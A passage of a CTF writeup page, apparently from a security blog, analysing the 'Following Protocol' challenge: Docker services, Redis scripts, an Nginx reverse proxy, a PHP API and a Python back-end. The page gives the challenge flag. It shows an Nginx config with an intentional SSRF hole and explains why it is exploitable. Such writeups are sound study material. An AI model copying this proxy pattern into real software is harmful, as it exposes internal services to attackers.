@@ -1,0 +1,541 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="description" content="CTF writeups, digital forensics, and cyber security notes by k3ng."><meta name="generator" content="Astro v7.1.1"><meta property="og:title" content="Following Protocol | k3ng.xyz"><meta property="og:description" content="CTF writeups, digital forensics, and cyber security notes by k3ng."><meta property="og:type" content="website"><link rel="icon" type="image/jpeg" href="/favicon.jpg"><link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link href="https://fonts.googleapis.com/css2?family=DM+Mono:wght@400;500&family=Manrope:wght@400;500;600;700;800&display=swap" rel="stylesheet"><title>Following Protocol | k3ng.xyz</title><script>
+      const savedTheme = localStorage.getItem('theme');
+      const preferredTheme = matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light';
+      document.documentElement.dataset.theme = savedTheme || preferredTheme;
+    </script><link rel="stylesheet" href="/_astro/BaseLayout.DZwBvaeU.css"></head><body><header class="site-header"><div class="header-inner"><a class="wordmark" href="/" aria-label="Home">k3ng</a><nav aria-label="Primary navigation"><a href="/blog">Blog</a><a href="/writeups" aria-current="page">Writeups</a><a href="/about">About</a></nav><button class="theme-toggle" type="button" aria-label="Toggle color theme"><span class="theme-light" aria-hidden="true">☼</span><span class="theme-dark" aria-hidden="true">☾</span></button></div></header><main class="article-shell has-toc"><article><header class="article-header"><p class="eyebrow">The Australian Cyber Security Games 2025</p><h1>Following Protocol</h1><ul class="article-tags" aria-label="Article tags"><li>ssrf</li><li>redis</li><li>nginx</li><li>path-traversal</li><li>aes-cbc</li></ul></header><div class="prose"><h3 id="challenge-description">Challenge Description</h3>
+<p>As the citizens of Freedonia come together to vote, it’s important we all follow protocol to ensure a successful and fair election.</p>
+<p>However, we have detected that the user by the name “wbc” has managed to vote for another candidate outside of our 5!</p>
+<p>Please confirm who “wbc” has voted for, and report back any other vulnerabilities you may discover on your way!</p>
+<h3 id="flag">Flag</h3>
+<p><code>secedu{s0ck3ts_r_kInD@_kewl}</code></p>
+<hr>
+<h3 id="source-analysis">Source Analysis</h3>
+<h4 id="infrastructure-overview">Infrastructure Overview</h4>
+<p>We are given the source code of the challenges containing five services. </p>
+<p>The first service is a Redis database that serves as the main database for the application to store the votes and images. The second service is an Nginx container that serves as a reverse proxy for the other services and also serves the <code>img</code> API endpoint. The third one is a PHP service named <code>v1</code> that serves an API to retrieve candidate data from an SQLite3 database. The fourth one is a Python-based back-end named <code>v2</code> that will do the encryption of votes and certificate generation. The last service is the main application built with Node JS.</p>
+<p>Note that the only public-facing service is the Node JS application and other services are internal.</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="yaml"><code><span class="line"><span style="color:#7EE787">services</span><span style="color:#E6EDF3">:</span></span>
+<span class="line"><span style="color:#7EE787">  redis</span><span style="color:#E6EDF3">:</span></span>
+<span class="line"><span style="color:#7EE787">    build</span><span style="color:#E6EDF3">:</span></span>
+<span class="line"><span style="color:#7EE787">      context</span><span style="color:#E6EDF3">: </span><span style="color:#A5D6FF">./redis</span></span>
+<span class="line"><span style="color:#7EE787">      dockerfile</span><span style="color:#E6EDF3">: </span><span style="color:#A5D6FF">Dockerfile</span></span>
+<span class="line"><span style="color:#7EE787">    user</span><span style="color:#E6EDF3">: </span><span style="color:#A5D6FF">"0"</span></span>
+<span class="line"><span style="color:#7EE787">    command</span><span style="color:#E6EDF3">: </span><span style="color:#FF7B72">></span></span>
+<span class="line"><span style="color:#A5D6FF">      bash -c "chmod +x /init.sh /restore.sh &#x26;&#x26; /init.sh"</span></span>
+<span class="line"><span style="color:#7EE787">    volumes</span><span style="color:#E6EDF3">:</span></span>
+<span class="line"><span style="color:#E6EDF3">      - </span><span style="color:#A5D6FF">redis-socket:/redis</span></span>
+<span class="line"><span style="color:#E6EDF3">      - </span><span style="color:#A5D6FF">./redis/init.sh:/init.sh</span></span>
+<span class="line"><span style="color:#E6EDF3">      - </span><span style="color:#A5D6FF">./redis/restore.sh:/restore.sh</span></span>
+<span class="line"><span style="color:#E6EDF3">      - </span><span style="color:#A5D6FF">./redis/Alyssa_Che.jpg:/1.jpg</span></span>
+<span class="line"><span style="color:#E6EDF3">      - </span><span style="color:#A5D6FF">./redis/Elira_Voss.jpg:/2.jpg</span></span>
+<span class="line"><span style="color:#E6EDF3">      - </span><span style="color:#A5D6FF">./redis/Henrik_Stahl.jpg:/3.jpg</span></span>
+<span class="line"><span style="color:#E6EDF3">      - </span><span style="color:#A5D6FF">./redis/Marcus_Delane.jpg:/4.jpg</span></span>
+<span class="line"><span style="color:#E6EDF3">      - </span><span style="color:#A5D6FF">./redis/Rhea_Kael.jpg:/5.jpg</span></span>
+<span class="line"><span style="color:#7EE787">    networks</span><span style="color:#E6EDF3">:</span></span>
+<span class="line"><span style="color:#E6EDF3">      - </span><span style="color:#A5D6FF">ctfnet</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#7EE787">  nginx</span><span style="color:#E6EDF3">:</span></span>
+<span class="line"><span style="color:#7EE787">    image</span><span style="color:#E6EDF3">: </span><span style="color:#A5D6FF">openresty/openresty:alpine</span></span>
+<span class="line"><span style="color:#7EE787">    volumes</span><span style="color:#E6EDF3">:</span></span>
+<span class="line"><span style="color:#E6EDF3">      - </span><span style="color:#A5D6FF">./nginx/default.conf:/etc/nginx/conf.d/default.conf</span></span>
+<span class="line"><span style="color:#E6EDF3">      - </span><span style="color:#A5D6FF">./nginx/img.conf:/etc/nginx/conf.d/img.conf</span></span>
+<span class="line"><span style="color:#E6EDF3">      - </span><span style="color:#A5D6FF">redis-socket:/redis</span></span>
+<span class="line"><span style="color:#7EE787">    depends_on</span><span style="color:#E6EDF3">:</span></span>
+<span class="line"><span style="color:#E6EDF3">      - </span><span style="color:#A5D6FF">v1</span></span>
+<span class="line"><span style="color:#E6EDF3">      - </span><span style="color:#A5D6FF">v2</span></span>
+<span class="line"><span style="color:#E6EDF3">      - </span><span style="color:#A5D6FF">redis</span></span>
+<span class="line"><span style="color:#7EE787">    networks</span><span style="color:#E6EDF3">:</span></span>
+<span class="line"><span style="color:#7EE787">      ctfnet</span><span style="color:#E6EDF3">:</span></span>
+<span class="line"><span style="color:#7EE787">        aliases</span><span style="color:#E6EDF3">:</span></span>
+<span class="line"><span style="color:#E6EDF3">          - </span><span style="color:#A5D6FF">backend.wbc</span></span>
+<span class="line"><span style="color:#E6EDF3">          - </span><span style="color:#A5D6FF">img.backend.wbc</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#7EE787">  v1</span><span style="color:#E6EDF3">:</span></span>
+<span class="line"><span style="color:#7EE787">    image</span><span style="color:#E6EDF3">: </span><span style="color:#A5D6FF">php:8.2-cli</span></span>
+<span class="line"><span style="color:#7EE787">    command</span><span style="color:#E6EDF3">: </span><span style="color:#A5D6FF">php -S 0.0.0.0:80 -t /app</span></span>
+<span class="line"><span style="color:#7EE787">    volumes</span><span style="color:#E6EDF3">:</span></span>
+<span class="line"><span style="color:#E6EDF3">      - </span><span style="color:#A5D6FF">./php-backend:/app</span></span>
+<span class="line"><span style="color:#7EE787">    networks</span><span style="color:#E6EDF3">:</span></span>
+<span class="line"><span style="color:#7EE787">      ctfnet</span><span style="color:#E6EDF3">:</span></span>
+<span class="line"><span style="color:#7EE787">        aliases</span><span style="color:#E6EDF3">:</span></span>
+<span class="line"><span style="color:#E6EDF3">          - </span><span style="color:#A5D6FF">v1.backend.wbc</span></span>
+<span class="line"><span style="color:#7EE787">    hostname</span><span style="color:#E6EDF3">: </span><span style="color:#A5D6FF">v1.backend.wbc</span></span>
+<span class="line"><span style="color:#E6EDF3">  </span></span>
+<span class="line"><span style="color:#7EE787">  v2</span><span style="color:#E6EDF3">:</span></span>
+<span class="line"><span style="color:#7EE787">    build</span><span style="color:#E6EDF3">: </span><span style="color:#A5D6FF">./python-backend</span></span>
+<span class="line"><span style="color:#7EE787">    ports</span><span style="color:#E6EDF3">:</span></span>
+<span class="line"><span style="color:#E6EDF3">      - </span><span style="color:#A5D6FF">"8008:80"</span></span>
+<span class="line"><span style="color:#7EE787">    volumes</span><span style="color:#E6EDF3">:</span></span>
+<span class="line"><span style="color:#E6EDF3">      - </span><span style="color:#A5D6FF">redis-socket:/redis</span></span>
+<span class="line"><span style="color:#7EE787">    networks</span><span style="color:#E6EDF3">:</span></span>
+<span class="line"><span style="color:#7EE787">      ctfnet</span><span style="color:#E6EDF3">:</span></span>
+<span class="line"><span style="color:#7EE787">        aliases</span><span style="color:#E6EDF3">:</span></span>
+<span class="line"><span style="color:#E6EDF3">          - </span><span style="color:#A5D6FF">v2.backend.wbc</span></span>
+<span class="line"><span style="color:#7EE787">    hostname</span><span style="color:#E6EDF3">: </span><span style="color:#A5D6FF">v2.backend.wbc</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#7EE787">  node</span><span style="color:#E6EDF3">:</span></span>
+<span class="line"><span style="color:#7EE787">    build</span><span style="color:#E6EDF3">: </span><span style="color:#A5D6FF">./node-app</span></span>
+<span class="line"><span style="color:#7EE787">    ports</span><span style="color:#E6EDF3">:</span></span>
+<span class="line"><span style="color:#E6EDF3">      - </span><span style="color:#A5D6FF">"80:80"</span></span>
+<span class="line"><span style="color:#7EE787">    networks</span><span style="color:#E6EDF3">:</span></span>
+<span class="line"><span style="color:#E6EDF3">      - </span><span style="color:#A5D6FF">ctfnet</span></span>
+<span class="line"><span style="color:#7EE787">    depends_on</span><span style="color:#E6EDF3">:</span></span>
+<span class="line"><span style="color:#E6EDF3">      - </span><span style="color:#A5D6FF">nginx</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#7EE787">volumes</span><span style="color:#E6EDF3">:</span></span>
+<span class="line"><span style="color:#7EE787">  redis-socket</span><span style="color:#E6EDF3">:</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#7EE787">networks</span><span style="color:#E6EDF3">:</span></span>
+<span class="line"><span style="color:#7EE787">  ctfnet</span><span style="color:#E6EDF3">:</span></span>
+<span class="line"><span style="color:#7EE787">    driver</span><span style="color:#E6EDF3">: </span><span style="color:#A5D6FF">bridge</span></span>
+<span class="line"></span></code></pre>
+<h4 id="redis-service">Redis service</h4>
+<p>The source files for the Redis service contains Bash scripts for initializing and resetting the service itself, and images of the candidates.</p>
+<p>The thing worth noting is that the Redis database is only served through a Unix socket, so the database is not accessible through the usual TCP socket, evident from the <code>--port 0</code> argument. This will be the main caveat that we need to work around.</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#8B949E">#!/bin/bash</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#8B949E"># Create socket dir with permissive access</span></span>
+<span class="line"><span style="color:#FFA657">mkdir</span><span style="color:#79C0FF"> -p</span><span style="color:#A5D6FF"> /redis</span></span>
+<span class="line"><span style="color:#FFA657">chmod</span><span style="color:#79C0FF"> 777</span><span style="color:#A5D6FF"> /redis</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#8B949E"># Start Redis in the background</span></span>
+<span class="line"><span style="color:#FFA657">redis-server</span><span style="color:#79C0FF"> --unixsocket</span><span style="color:#A5D6FF"> /redis/redis.sock</span><span style="color:#79C0FF"> --unixsocketperm</span><span style="color:#79C0FF"> 777</span><span style="color:#79C0FF"> --port</span><span style="color:#79C0FF"> 0</span><span style="color:#E6EDF3"> &#x26;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#8B949E"># Wait briefly to ensure Redis is ready</span></span>
+<span class="line"><span style="color:#FFA657">sleep</span><span style="color:#79C0FF"> 1</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#FFA657">/restore.sh</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#79C0FF">echo</span><span style="color:#A5D6FF"> "SHELL=/bin/bash"</span><span style="color:#FF7B72"> ></span><span style="color:#A5D6FF"> /etc/cron.d/redis-restore</span></span>
+<span class="line"><span style="color:#79C0FF">echo</span><span style="color:#A5D6FF"> "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"</span><span style="color:#FF7B72"> >></span><span style="color:#A5D6FF"> /etc/cron.d/redis-restore</span></span>
+<span class="line"><span style="color:#79C0FF">echo</span><span style="color:#A5D6FF"> "* * * * * /restore.sh >> /var/log/cron.log 2>&#x26;1"</span><span style="color:#FF7B72"> >></span><span style="color:#A5D6FF"> /etc/cron.d/redis-restore</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#FFA657">chmod</span><span style="color:#79C0FF"> 0644</span><span style="color:#A5D6FF"> /etc/cron.d/redis-restore</span></span>
+<span class="line"><span style="color:#FFA657">touch</span><span style="color:#A5D6FF"> /var/log/cron.log</span></span>
+<span class="line"><span style="color:#FFA657">crontab</span><span style="color:#A5D6FF"> /etc/cron.d/redis-restore</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#FFA657">cron</span></span>
+<span class="line"><span style="color:#FFA657">tail</span><span style="color:#79C0FF"> -f</span><span style="color:#A5D6FF"> /var/log/cron.log</span><span style="color:#E6EDF3"> &#x26;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#8B949E"># Wait on Redis process</span></span>
+<span class="line"><span style="color:#79C0FF">wait</span></span></code></pre>
+<p>The reset script shows that there is a seed data with the name of <code>wbc</code>, which corresponds to the target user we need to leak data from based on the challenge description.</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#8B949E">#!/bin/bash</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#8B949E"># Clear all existing data</span></span>
+<span class="line"><span style="color:#FFA657">redis-cli</span><span style="color:#79C0FF"> -s</span><span style="color:#A5D6FF"> /redis/redis.sock</span><span style="color:#A5D6FF"> FLUSHALL</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#8B949E"># Restore seed data</span></span>
+<span class="line"><span style="color:#FFA657">redis-cli</span><span style="color:#79C0FF"> -s</span><span style="color:#A5D6FF"> /redis/redis.sock</span><span style="color:#A5D6FF"> HSET</span><span style="color:#A5D6FF"> wbc</span><span style="color:#A5D6FF"> name</span><span style="color:#A5D6FF"> wbc</span></span>
+<span class="line"><span style="color:#FFA657">redis-cli</span><span style="color:#79C0FF"> -s</span><span style="color:#A5D6FF"> /redis/redis.sock</span><span style="color:#A5D6FF"> HSET</span><span style="color:#A5D6FF"> wbc</span><span style="color:#A5D6FF"> certifier</span><span style="color:#A5D6FF"> REDACTED</span></span>
+<span class="line"><span style="color:#FFA657">redis-cli</span><span style="color:#79C0FF"> -s</span><span style="color:#A5D6FF"> /redis/redis.sock</span><span style="color:#A5D6FF"> HSET</span><span style="color:#A5D6FF"> wbc</span><span style="color:#A5D6FF"> voted_for</span><span style="color:#A5D6FF"> dGhpc2hhc2JlZW5yZWRhY3RlZGZvcnlvdSxnb2ZpbmR0aGVyZWFsdmFsdWVub3ch</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#8B949E"># Restore images</span></span>
+<span class="line"><span style="color:#FFA657">redis-cli</span><span style="color:#79C0FF"> -s</span><span style="color:#A5D6FF"> /redis/redis.sock</span><span style="color:#A5D6FF"> SET</span><span style="color:#A5D6FF"> img:1</span><span style="color:#A5D6FF"> "$(</span><span style="color:#FFA657">base64</span><span style="color:#A5D6FF"> /1.jpg)"</span></span>
+<span class="line"><span style="color:#FFA657">redis-cli</span><span style="color:#79C0FF"> -s</span><span style="color:#A5D6FF"> /redis/redis.sock</span><span style="color:#A5D6FF"> SET</span><span style="color:#A5D6FF"> img:2</span><span style="color:#A5D6FF"> "$(</span><span style="color:#FFA657">base64</span><span style="color:#A5D6FF"> /2.jpg)"</span></span>
+<span class="line"><span style="color:#FFA657">redis-cli</span><span style="color:#79C0FF"> -s</span><span style="color:#A5D6FF"> /redis/redis.sock</span><span style="color:#A5D6FF"> SET</span><span style="color:#A5D6FF"> img:3</span><span style="color:#A5D6FF"> "$(</span><span style="color:#FFA657">base64</span><span style="color:#A5D6FF"> /3.jpg)"</span></span>
+<span class="line"><span style="color:#FFA657">redis-cli</span><span style="color:#79C0FF"> -s</span><span style="color:#A5D6FF"> /redis/redis.sock</span><span style="color:#A5D6FF"> SET</span><span style="color:#A5D6FF"> img:4</span><span style="color:#A5D6FF"> "$(</span><span style="color:#FFA657">base64</span><span style="color:#A5D6FF"> /4.jpg)"</span></span>
+<span class="line"><span style="color:#FFA657">redis-cli</span><span style="color:#79C0FF"> -s</span><span style="color:#A5D6FF"> /redis/redis.sock</span><span style="color:#A5D6FF"> SET</span><span style="color:#A5D6FF"> img:5</span><span style="color:#A5D6FF"> "$(</span><span style="color:#FFA657">base64</span><span style="color:#A5D6FF"> /5.jpg)"</span></span></code></pre>
+<h4 id="nginx-service">Nginx service</h4>
+<p>The Nginx service contains two configurations: <code>default.conf</code> and <code>img.conf</code>.</p>
+<p><code>default.conf</code> will proxy requests for the <code>backend.wbc</code> server name. For example, if you are accessing <code>http://backend.wbc/v1/something</code>, it will resolve to <code>http://v1.backend.wbc/something</code>. This kind of configuration is risky because the subdomain and the path is attacker-controlled and there are no sanitization in place, therefore opening this configuration up to SSRF attacks which we will get back to later.</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="nginx"><code><span class="line"><span style="color:#FF7B72">server</span><span style="color:#E6EDF3"> {</span></span>
+<span class="line"><span style="color:#FF7B72">    listen </span><span style="color:#79C0FF">80</span><span style="color:#E6EDF3">;</span></span>
+<span class="line"><span style="color:#FF7B72">    server_name </span><span style="color:#E6EDF3">backend.wbc;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#FF7B72">    resolver </span><span style="color:#79C0FF">127.0.0.11</span><span style="color:#E6EDF3"> valid=10s;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#FF7B72">    location</span><span style="color:#FF7B72"> ~</span><span style="color:#A5D6FF"> /(.*)/(.*) </span><span style="color:#E6EDF3">{</span></span>
+<span class="line"><span style="color:#FF7B72">        proxy_pass </span><span style="color:#E6EDF3">http://$1.backend.wbc/$2;</span></span>
+<span class="line"><span style="color:#E6EDF3">    }</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#FF7B72">    location</span><span style="color:#FFA657"> / </span><span style="color:#E6EDF3">{</span></span>
+<span class="line"><span style="color:#FF7B72">        return</span><span style="color:#79C0FF"> 404</span><span style="color:#E6EDF3">;</span></span>
+<span class="line"><span style="color:#E6EDF3">    }</span></span>
+<span class="line"><span style="color:#E6EDF3">}</span></span></code></pre>
+<p>The <code>img.conf</code> configuration will connect to the Redis service and fetches the image based on an ID. Note that this configuration will check if the ID portion of the path only contains numbers.</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="nginx"><code><span class="line"><span style="color:#FF7B72">server</span><span style="color:#E6EDF3"> {</span></span>
+<span class="line"><span style="color:#FF7B72">    listen </span><span style="color:#79C0FF">80</span><span style="color:#E6EDF3">;</span></span>
+<span class="line"><span style="color:#FF7B72">    server_name </span><span style="color:#E6EDF3">img.backend.wbc;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#FF7B72">    location</span><span style="color:#FFA657"> / </span><span style="color:#E6EDF3">{</span></span>
+<span class="line"><span style="color:#FF7B72">        content_by_lua_block</span><span style="color:#E6EDF3"> {</span></span>
+<span class="line"><span style="color:#FF7B72">            local</span><span style="color:#E6EDF3"> redis </span><span style="color:#FF7B72">=</span><span style="color:#79C0FF"> require</span><span style="color:#A5D6FF"> "resty.redis"</span></span>
+<span class="line"><span style="color:#FF7B72">            local</span><span style="color:#E6EDF3"> r </span><span style="color:#FF7B72">=</span><span style="color:#FFA657"> redis</span><span style="color:#E6EDF3">:</span><span style="color:#79C0FF">new</span><span style="color:#E6EDF3">()</span></span>
+<span class="line"><span style="color:#FFA657">            r</span><span style="color:#E6EDF3">:</span><span style="color:#79C0FF">set_timeout</span><span style="color:#E6EDF3">(</span><span style="color:#79C0FF">1000</span><span style="color:#E6EDF3">)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#FF7B72">            local</span><span style="color:#E6EDF3"> ok, err </span><span style="color:#FF7B72">=</span><span style="color:#FFA657"> r</span><span style="color:#E6EDF3">:</span><span style="color:#79C0FF">connect</span><span style="color:#E6EDF3">(</span><span style="color:#A5D6FF">"unix:/redis/redis.sock"</span><span style="color:#E6EDF3">)</span></span>
+<span class="line"><span style="color:#FF7B72">            if</span><span style="color:#FF7B72"> not</span><span style="color:#E6EDF3"> ok </span><span style="color:#FF7B72">then</span></span>
+<span class="line"><span style="color:#E6EDF3">                ngx.</span><span style="color:#79C0FF">status</span><span style="color:#FF7B72"> =</span><span style="color:#79C0FF"> 502</span></span>
+<span class="line"><span style="color:#E6EDF3">                ngx.</span><span style="color:#79C0FF">say</span><span style="color:#E6EDF3">(</span><span style="color:#A5D6FF">"Redis connection failed: "</span><span style="color:#E6EDF3">, err)</span></span>
+<span class="line"><span style="color:#FF7B72">                return</span></span>
+<span class="line"><span style="color:#FF7B72">            end</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#FF7B72">            local</span><span style="color:#E6EDF3"> id </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> ngx.</span><span style="color:#79C0FF">var</span><span style="color:#E6EDF3">.</span><span style="color:#FFA657">uri</span><span style="color:#E6EDF3">:</span><span style="color:#79C0FF">sub</span><span style="color:#E6EDF3">(</span><span style="color:#79C0FF">2</span><span style="color:#E6EDF3">)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#FF7B72">            if</span><span style="color:#FF7B72"> not</span><span style="color:#FFA657"> id</span><span style="color:#E6EDF3">:</span><span style="color:#79C0FF">match</span><span style="color:#E6EDF3">(</span><span style="color:#A5D6FF">"^%d+$"</span><span style="color:#E6EDF3">) </span><span style="color:#FF7B72">then</span></span>
+<span class="line"><span style="color:#E6EDF3">                ngx.</span><span style="color:#79C0FF">status</span><span style="color:#FF7B72"> =</span><span style="color:#79C0FF"> 404</span></span>
+<span class="line"><span style="color:#E6EDF3">                ngx.</span><span style="color:#79C0FF">say</span><span style="color:#E6EDF3">(</span><span style="color:#A5D6FF">"Image not found"</span><span style="color:#E6EDF3">)</span></span>
+<span class="line"><span style="color:#FF7B72">                return</span></span>
+<span class="line"><span style="color:#FF7B72">            end</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#FF7B72">            local</span><span style="color:#E6EDF3"> res, err </span><span style="color:#FF7B72">=</span><span style="color:#FFA657"> r</span><span style="color:#E6EDF3">:</span><span style="color:#79C0FF">get</span><span style="color:#E6EDF3">(</span><span style="color:#A5D6FF">"img:" </span><span style="color:#FF7B72">..</span><span style="color:#E6EDF3"> id)</span></span>
+<span class="line"><span style="color:#FF7B72">            if</span><span style="color:#FF7B72"> not</span><span style="color:#E6EDF3"> res </span><span style="color:#FF7B72">or</span><span style="color:#E6EDF3"> res </span><span style="color:#FF7B72">==</span><span style="color:#E6EDF3"> ngx.</span><span style="color:#79C0FF">null</span><span style="color:#FF7B72"> then</span></span>
+<span class="line"><span style="color:#E6EDF3">                ngx.</span><span style="color:#79C0FF">status</span><span style="color:#FF7B72"> =</span><span style="color:#79C0FF"> 404</span></span>
+<span class="line"><span style="color:#E6EDF3">                ngx.</span><span style="color:#79C0FF">say</span><span style="color:#E6EDF3">(</span><span style="color:#A5D6FF">"Image not found"</span><span style="color:#E6EDF3">)</span></span>
+<span class="line"><span style="color:#FF7B72">                return</span></span>
+<span class="line"><span style="color:#FF7B72">            end</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E6EDF3">            ngx.</span><span style="color:#79C0FF">header</span><span style="color:#E6EDF3">.</span><span style="color:#79C0FF">content_type</span><span style="color:#FF7B72"> =</span><span style="color:#A5D6FF"> "image/jpg"</span></span>
+<span class="line"><span style="color:#E6EDF3">            ngx.</span><span style="color:#79C0FF">print</span><span style="color:#E6EDF3">(res)</span></span>
+<span class="line"><span style="color:#E6EDF3">        }</span></span>
+<span class="line"><span style="color:#E6EDF3">    }</span></span>
+<span class="line"><span style="color:#E6EDF3">}</span></span></code></pre>
+<h4 id="php-service-v1">PHP service (v1)</h4>
+<p>This service is actually pretty boring. This service will accept request on the <code>/candidates</code> endpoint and fetches candidate data from an SQLite3 database.</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="php"><code><span class="line"><span style="color:#FF7B72">&#x3C;?</span><span style="color:#79C0FF">php</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#79C0FF">header</span><span style="color:#E6EDF3">(</span><span style="color:#A5D6FF">'Content-Type: application/json'</span><span style="color:#E6EDF3">);</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E6EDF3">$dbFile </span><span style="color:#FF7B72">=</span><span style="color:#79C0FF"> __DIR__</span><span style="color:#FF7B72"> .</span><span style="color:#A5D6FF"> '/database.sqlite'</span><span style="color:#E6EDF3">;</span></span>
+<span class="line"><span style="color:#E6EDF3">$db </span><span style="color:#FF7B72">=</span><span style="color:#FF7B72"> new</span><span style="color:#79C0FF"> SQLite3</span><span style="color:#E6EDF3">($dbFile);</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E6EDF3">$method </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> $_SERVER[</span><span style="color:#A5D6FF">'REQUEST_METHOD'</span><span style="color:#E6EDF3">];</span></span>
+<span class="line"><span style="color:#E6EDF3">$uri </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> $_SERVER[</span><span style="color:#A5D6FF">'REQUEST_URI'</span><span style="color:#E6EDF3">];</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#FF7B72">if</span><span style="color:#E6EDF3"> ($method </span><span style="color:#FF7B72">===</span><span style="color:#A5D6FF"> 'GET'</span><span style="color:#FF7B72"> &#x26;&#x26;</span><span style="color:#E6EDF3"> $uri </span><span style="color:#FF7B72">===</span><span style="color:#A5D6FF"> '/candidates'</span><span style="color:#E6EDF3">) {</span></span>
+<span class="line"><span style="color:#E6EDF3">    $results </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> $db</span><span style="color:#FF7B72">-></span><span style="color:#D2A8FF">query</span><span style="color:#E6EDF3">(</span><span style="color:#A5D6FF">'</span><span style="color:#FF7B72">SELECT</span><span style="color:#A5D6FF"> id, </span><span style="color:#FF7B72">name</span><span style="color:#A5D6FF">, slogan, party </span><span style="color:#FF7B72">FROM</span><span style="color:#A5D6FF"> candidates'</span><span style="color:#E6EDF3">);</span></span>
+<span class="line"><span style="color:#E6EDF3">    $candidates </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> [];</span></span>
+<span class="line"><span style="color:#FF7B72">    while</span><span style="color:#E6EDF3"> ($row </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> $results</span><span style="color:#FF7B72">-></span><span style="color:#D2A8FF">fetchArray</span><span style="color:#E6EDF3">(</span><span style="color:#79C0FF">SQLITE3_ASSOC</span><span style="color:#E6EDF3">)) {</span></span>
+<span class="line"><span style="color:#E6EDF3">        $candidates[] </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> $row;</span></span>
+<span class="line"><span style="color:#E6EDF3">    }</span></span>
+<span class="line"><span style="color:#79C0FF">    echo</span><span style="color:#79C0FF"> json_encode</span><span style="color:#E6EDF3">([</span><span style="color:#A5D6FF">'candidates'</span><span style="color:#FF7B72"> =></span><span style="color:#E6EDF3"> $candidates]);</span></span>
+<span class="line"><span style="color:#FF7B72">    exit</span><span style="color:#E6EDF3">;</span></span>
+<span class="line"><span style="color:#E6EDF3">}</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#79C0FF">http_response_code</span><span style="color:#E6EDF3">(</span><span style="color:#79C0FF">404</span><span style="color:#E6EDF3">);</span></span>
+<span class="line"><span style="color:#79C0FF">echo</span><span style="color:#79C0FF"> json_encode</span><span style="color:#E6EDF3">([</span><span style="color:#A5D6FF">'error'</span><span style="color:#FF7B72"> =></span><span style="color:#A5D6FF"> 'Not Found'</span><span style="color:#E6EDF3">]);</span></span></code></pre>
+<h4 id="python-service-v2">Python service (v2)</h4>
+<p>The back-end hosts the main business logic of the application: voting and certificate generation. Let’s start with the voting mechanism.</p>
+<p>The <code>Dockerfile</code> reveals an environment variable called <code>ENCRYPTION_KEY</code> that is saved to a file called <code>.env</code>.</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="docker"><code><span class="line"><span style="color:#FF7B72">FROM</span><span style="color:#E6EDF3"> python:3.11-slim</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#FF7B72">WORKDIR</span><span style="color:#E6EDF3"> /app</span></span>
+<span class="line"><span style="color:#FF7B72">COPY</span><span style="color:#E6EDF3"> . .</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#FF7B72">RUN</span><span style="color:#E6EDF3"> pip install flask redis reportlab cryptography python-dotenv</span></span>
+<span class="line"><span style="color:#FF7B72">RUN</span><span style="color:#E6EDF3"> mkdir /app/exports</span></span>
